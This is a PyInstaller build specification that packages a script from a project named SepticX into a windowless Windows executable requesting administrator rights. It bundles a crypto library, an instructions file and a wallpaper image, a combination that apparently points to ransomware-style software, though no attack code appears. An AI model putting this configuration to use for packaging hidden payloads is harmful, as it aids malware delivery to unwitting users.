# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ['C:\\Users\\ekila\\Downloads\\SepticX-main (1)\\SepticX-main\\src\\output.py'],
    pathex=[],
    binaries=[],
    datas=[('C:\\Users\\ekila\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\coincurve', 'coincurve'), ('C:\\Users\\ekila\\Downloads\\SepticX-main (1)\\SepticX-main\\src\\temp\\instructions.txt', '.'), ('C:\\Users\\ekila\\Downloads\\SepticX-main (1)\\SepticX-main\\src\\files\\wallpaper.jpg', '.'), ('C:\\Users\\ekila\\Downloads\\SepticX-main (1)\\SepticX-main\\src\\files\\failed.jpg', '.')],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='output',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    uac_admin=True,
)
